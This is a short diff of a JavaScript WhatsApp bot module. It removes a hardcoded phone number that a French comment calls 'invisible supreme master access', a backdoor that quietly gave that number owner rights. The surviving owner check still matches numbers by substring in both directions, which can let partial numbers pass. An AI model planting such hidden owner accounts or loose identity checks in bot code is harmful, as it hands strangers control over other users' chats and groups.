@@ -40,16 +40,12 @@ module.exports = {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
-      const supremeOwner = '22651622652';
-      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
-
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+      const isMe = msg.key.fromMe || isConfigOwner;
 
       // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
       if (!isMe) {
